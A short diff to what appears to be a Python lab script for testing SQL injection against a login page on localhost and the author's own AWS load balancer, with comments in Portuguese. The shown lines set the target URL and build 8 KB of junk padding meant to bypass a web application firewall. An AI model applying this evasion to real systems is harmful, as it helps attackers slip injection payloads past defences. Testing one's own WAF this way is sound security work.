@@ -5,7 +5,7 @@ import time
 # Configuração
 url = "http://localhost/sqli-login.php" # colocar aqui a url de destino da aplicação, 
 # no meu caso tenho o ambiente "localhost" e também o destino com o ALB da AWS
-# "http://app-alb..."
+# "http://alb-sg-243851779.us-east-1.elb.amazonaws.com/use-case-sqli-login.php"
 
 # 1. Gerar 8KB de lixo (O Bypass do WAF)
 lixo = "A" * 8192 # comente aqui caso não queira utilizar o bypass
